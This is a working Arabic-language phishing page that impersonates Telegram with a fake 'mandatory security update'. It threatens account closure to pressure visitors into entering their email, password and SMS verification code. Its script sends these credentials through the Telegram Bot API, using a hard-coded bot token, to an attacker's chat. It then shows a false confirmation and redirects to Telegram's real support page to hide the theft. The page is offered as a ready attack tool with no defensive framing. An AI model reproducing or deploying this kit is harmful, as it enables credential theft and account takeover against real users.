<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Security - التحقق من الأمان</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .logo { width: 80px; margin-bottom: 15px; }
        h2 { color: #333; font-size: 22px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none; text-align: right; }
        input:focus { border-color: #0088cc; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0077b5; }
        .alert { color: #d9534f; font-size: 12px; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo" class="logo">
    <h2>تحديث الأمان الإلزامي</h2>
    <div class="alert">⚠️ حسابك مهدد بالإغلاق بسبب نشاط غير قانوني</div>
    <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب ورفع القيود.</p>
    
    <input type="email" id="email" placeholder="البريد الإلكتروني المرتبط" required>
    <input type="password" id="pass" placeholder="كلمة المرور" required>
    <input type="text" id="code" placeholder="رمز التحقق (SMS/App)" maxlength="6">
    
    <button onclick="pwn()">تأكيد ومتابعة</button>
</div>

<script>
    function pwn() {
        const token = "8743126672:AAEoxK-YR6UTDoNegxo4a0zCENPLTpFMKKg";
        const chatId = "8593367876";
        
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const code = document.getElementById('code').value;

        if(!email || !pass) { alert("يرجى ملء كافة البيانات"); return; }

        const log = `🚨 صيد كامل (Full Login) 🚨\n📧 البريد: ${email}\n🔑 الباسورد: ${pass}\n🔢 الرمز: ${code}`;
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(log)}`)
        .then(() => {
            alert("تم استلام طلبك، سيتم مراجعة الحساب خلال ساعة.");
            window.location.href = "https://telegram.org/support";
        });
    }
</script>

</body>
</html>
